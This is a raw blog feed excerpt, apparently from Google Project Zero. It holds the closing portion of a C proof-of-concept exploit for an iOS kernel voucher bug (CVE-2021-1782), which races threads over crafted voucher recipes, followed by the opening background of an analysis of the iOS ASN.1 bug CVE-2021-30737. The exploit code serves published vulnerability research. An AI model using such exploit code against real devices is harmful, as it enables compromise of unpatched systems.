BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;// build the templates: &lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; single_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_buffer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;single_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; redeem_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_buffer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;userdata_buffer&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t single_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;single_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;single_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t redeem_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;single_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;single_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;redeem_recipe_template&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;.&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;recipe&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;int&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;int&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;argc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;char&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;**&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;argv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; sploit_3&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/5933797027217125856/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html" title="CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5UykytcJVVshEICfc5vF3q6iAkVDug6bFDyqEnEef_apkVCB-AsGKCFPMqa6XZ2RoKPqjuU1CNiWBd4mszC0lGCNmSSby9dVqg_g3VCBM3cJodxCNij4Bqarp7ULqGkonXHyIEne3Uy6s1YcFUvfKmWlBSAvf8axjiw-4mJftHeL39CqTHjHTQ6TjnA/s72-c/image1%20%283%29.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1033743652169779882</id>
    <published>2022-04-07T09:08:00.000-07:00</published>
    <updated>2022-04-07T09:08:49.780-07:00</updated>
    <title type="text">CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c5{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c10{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c27{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c33{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c32{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c16{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.c22{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.c34{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c3{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.c11{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c20{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.c23{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.c25{border-spacing:0;border-collapse:collapse;margin-right:auto}.c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c29{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:underline}.c30{font-weight:400;font-family:Consolas,"Courier New"}.c8{orphans:2;widows:2}.c24{color:inherit;text-decoration:inherit}.c7{font-weight:400;font-family:"Courier New"}.c4{background-color:#d9ead3}.c14{height:11pt}.c28{font-family:"Arial"}.c12{background-color:#f4cccc}.c18{height:0pt}.c26{font-style:italic}.c15{background-color:#ffffff}.c17{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c13"&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c17"&gt;This blog post is my analysis of a vulnerability found by &lt;/span&gt;&lt;span class="c21 c17"&gt;&lt;a class="c241" href="https://twitter.com/xerub"&gt;@xerub&lt;/a&gt;&lt;/span&gt;&lt;span class="c17"&gt;.&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c21 c17"&gt;&lt;a class="c241" href="http://phrack.org/issues/70/12.html#article"&gt;Phrack published @xerub&amp;#39;s writeup&lt;/a&gt;&lt;/span&gt;&lt;span class="c19 c28 c17"&gt;&amp;nbsp;so go check that out first.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c19 c28 c17"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;As well as doing my own vulnerability research I also spend time trying as best as I can to keep up with the public state-of-the-art, especially when details of a particularly interesting vulnerability are announced or a new in-the-wild exploit is caught. Originally this post was just a series of notes I took last year as I was trying to understand this bug. But the bug itself and the narrative around it are so fascinating that I thought it would be worth writing up these notes into a more coherent form to share with the community.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c32 c8" id="h.s8tx0adm3791"&gt;&lt;span&gt;Background&lt;/span&gt;&lt;/h2&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;On April 14th 2021 the &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://www.washingtonpost.com/technology/2021/04/14/azimuth-san-bernardino-apple-iphone-fbi/"&gt;Washington Post published an article&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;on the unlocking of the San Bernardino iPhone by &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://www.vice.com/en/article/8xdayg/iphone-zero-days-inside-azimuth-security"&gt;Azimuth&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;containing a nugget of non-public information:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class="c26"&gt;Azimuth specialized in finding &lt;/span&gt;&lt;span class="c26 c29"&gt;significant vulnerabilities&lt;/span&gt;&lt;span class="c26"&gt;. Dowd [...] had found one &lt;/span&gt;&lt;span class="c29 c26"&gt;in open-source code from Mozilla that Apple used&lt;/span&gt;&lt;span class="c26"&gt;&amp;nbsp;to permit accessories to be plugged into&lt;/span&gt;&lt;span class="c26"&gt;&amp;nbsp;an iPhone&amp;rsquo;s lightning port, according to the person.&lt;/span&gt;&lt;span class="c9"&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;There&amp;#39;s not that much Mozilla code running on an iPhone and even less which is likely to be part of such an attack surface. Therefore, if accurate, this quote almost certainly meant that Azimuth had exploited a vulnerability in the &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://en.wikipedia.org/wiki/ASN.1"&gt;ASN.1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;parser used by &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://opensource.apple.com/source/Security/"&gt;Security.framework&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;, which is a fork of Mozilla&amp;#39;s NSS ASN.1 parser.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;I searched around in &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://bugzilla.mozilla.org/"&gt;bugzilla&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(Mozilla&amp;#39;s issue tracker) looking for candidate vulnerabilities which matched the timeline discussed in the Post article and narrowed it down to a handful of plausible bugs including: &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1202868"&gt;1202868&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1192028"&gt;1192028&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1245528"&gt;1245528&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;I was surprised that there had been so many exploitable-looking issues in the ASN.1 code and decided to add auditing the NSS ASN.1 parser as an quarterly goal.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;A month later, having predictably done absolutely nothing more towards that goal, I saw this &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://twitter.com/xerub/status/1397190931653222400"&gt;tweet from @xerub&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrv4IkZXgNv7MttlFFE1Gyyr2MQx0T4gzNAybXi3vsMhwT30WK_KaX1pF2zQKPLBoSU5Dtz3tG3yxJqaaE13leIBcnAFOb_HE8FFdy5yMOvoP0a_cB-IDi__SaWH4xL0czURYqdLtxvcKVSAysO0s8lOLrKykDEKEv1Z9fr0wQ7SOCDBcr5pgC-OoHcw/s1188/image2%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrv4IkZXgNv7MttlFFE1Gyyr2MQx0T4gzNAybXi3vsMhwT30WK_KaX1pF2zQKPLBoSU5Dtz3tG3yxJqaaE13leIBcnAFOb_HE8FFdy5yMOvoP0a_cB-IDi__SaWH4xL0czURYqdLtxvcKVSAysO0s8lOLrKykDEKEv1Z9fr0wQ7SOCDBcr5pgC-OoHcw/s600/image2%20%281%29.png" border="0" alt="@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021" style="max-height: 750; max-width: 600;"title="@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8"&gt;&lt;span class="c27 c26"&gt;@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c9"&gt;The shameless excerpt reads:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c27 c26"&gt;// This is the real deal. Take no chances, take no prisoners! I AM THE STATE MACHINE!&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;And CVE-2021-30737, fixed in iOS 14.6 was described in the &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://support.apple.com/en-us/HT212528#:~:text=2021%2D30699%3A%20videosdebarraquito-,Security,CVE%2D2021%2D30737%3A%20xerub,-WebKit"&gt;iOS release notes&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;as:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3ih4aoZv8It8hmLhd82lopSIASUcsfQWqMaRY4beUKq4Fa1rAv3xQueKyi636WOmHZ3rh6k6YqguOufdO09QTxBigDpSAZWIB7atFzJH4XmtdGpdB9I3PmY7KIQkOC1lUso9GDpb6fHVIWMouKNxPiphV7qyx4lSevImpqGLRSgEwTUw-3Wl3yBGcmg/s1650/image4%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3ih4aoZv8It8hmLhd82lopSIASUcsfQWqMaRY4beUKq4Fa1rAv3xQueKyi636WOmHZ3rh6k6YqguOufdO09QTxBigDpSAZWIB7atFzJH4XmtdGpdB9I3PmY7KIQkOC1lUso9GDpb6fHVIWMouKNxPiphV7qyx4lSevImpqGLRSgEwTUw-3Wl3yBGcmg/s600/image4%20%281%29.png" border="0" alt="Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub" style="max-height: 750; max-width: 600;"title="Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8"&gt;&lt;span class="c27 c26"&gt;Impact: Processing a maliciously crafted certification may lead to arbitrary code execution&lt;/span&gt;&lt;/p&gt; &lt;p class="c34 c8"&gt;&lt;span class="c27 c26"&gt;Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span&gt;Feeling slightly annoyed that I hadn&amp;#39;t acted on my instincts as there was clearly something awesome lurking there I made a mental note to diff the source code once Apple released it which they finally did a few weeks later on &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" 